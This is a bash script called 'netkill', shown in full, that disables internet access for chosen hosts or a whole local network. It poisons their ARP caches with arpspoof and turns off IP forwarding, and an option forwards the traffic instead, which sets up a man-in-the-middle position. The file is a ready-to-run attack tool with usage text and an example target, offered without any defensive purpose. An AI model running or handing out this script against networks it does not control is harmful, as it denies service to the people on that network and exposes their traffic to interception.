#!/bin/bash

# netkill 0.1.4 - disable internet access for users in your network
#
#  * make sure "arpsoof" is installed before using this script
#  * you can use nmap or a similar tool to get an overview of your network
#  * basically only the two commands are needed to disable the target's network:
#    $ arpspoof [-i interface] [-t target] host
#	 $ echo -n 0 > /proc/sys/net/ipv?/ip_forward
#
#  Copyright: (C) 2012 edloaa
#  License: GPL-3 <http://www.gnu.org/licenses/gpl-3.0.txt>

NAME='netkill'
VERS='0.1.4'
TARGET='ALL'
INTERFACE='wlan0'
FWD_CONF=/proc/sys/net/ipv?/ip_forward
FORWARD=false
QUIET=false
EXIT_STAT=0

c0="\e[0m"		# no color
c1="\e[1;32m"	# green
c2="\e[1;31m"	# red
c3="\e[1;34m"	# blue
c4="\e[1;33m"	# yellow

n=$(($RANDOM%4+1))

case $n in
	1) clr=$c1 ;;
	2) clr=$c2 ;;
	3) clr=$c3 ;;
	4) clr=$c4 ;;
esac

usage() {
	echo -e "$NAME $VERS: disable internet access for users in your network\n" 
	echo -e "usage: netkill [OPTIONS]\n"
	echo "OPTIONS:"
	echo " -t: <target>         [all]"
	echo " -i: <interface>      [wlan0]"
	echo " -f: forward traffic  [false]"
	echo " -q: quiet mode       [false]"
	echo -e " -h: show this help\n"
	echo "EXAMPLE:"
	echo " netkill -t 192.168.1.106"
	exit 0
}

msg() {
	[ $QUIET == false ] && echo -e " * $*"
}

err() {
	echo -e "$c2 E: $*$c0"
}

title() {
	[ $QUIET == false ] && {
		clear
		echo -ne $clr
		echo "              _   _    _ _ _	"
		echo "   _ __   ___| |_| | _(_) | |	"
		echo "  | '_ \ / _ \ __| |/ / | | |	"
		echo "  | | | |  __/ |_|   <| | | |	"
		echo "  |_| |_|\___|\__|_|\_\_|_|_| v.$VERS	"
		echo -e $c0
	}
}

one_line() {
	x=1
	while read LINE
	do
		if [ "$LINE" == "$LINE_OLD" ] || [ $x -eq 1 ]
		then
			echo -en "  $x: $LINE \r"
		else
			echo "  $x: $LINE"
		fi

		LINE_OLD="$LINE"
		((x++))

	done
}

while getopts ":t:i:fqh" OPTS
do
	case $OPTS in
		t) TARGET="$OPTARG" ;;
		f) FORWARD=true ;;
		i) INTERFACE="$OPTARG" ;;
		q) QUIET=true ;;
		*) usage ;;
	esac
done

title

if [ $UID -ne 0 ]
then
	err "$NAME script must be run as root"
	EXIT_STAT=1
fi

if ! type arpspoof &>/dev/null
then
	err "$NAME requires 'arpspoof'"
	EXIT_STAT=1
fi

if ! ping -c1 8.8.8.8 &>/dev/null
then
	err "no internet access"
	EXIT_STAT=1
fi

[ $EXIT_STAT -gt 0 ] && exit 1

HOST_IP=$(route -n | grep ^0.0.0.0 | awk '{print $2}')

msg "host: $HOST_IP"
msg "target: $TARGET"
msg "interface: $INTERFACE"

if [ $FORWARD == true ]
then
	msg "traffic will be forwarded"
	echo -n 1 > $FWD_CONF
else
	echo -n 0 > $FWD_CONF
fi

if [ $TARGET == "ALL" ]
then
	msg "running: arpspoof -i $INTERFACE $HOST_IP"
	msg "press < CTRL+C > to quit"
	echo
	arpspoof -i $INTERFACE $HOST_IP 2>&1 | one_line
else
	msg "running: arpspoof -i $INTERFACE -t $TARGET $HOST_IP"
	msg "press < CTRL+C > to quit"
	echo
	arpspoof -i $INTERFACE -t $TARGET $HOST_IP 2>&1 | one_line
fi

echo -e "\n"
exit 0
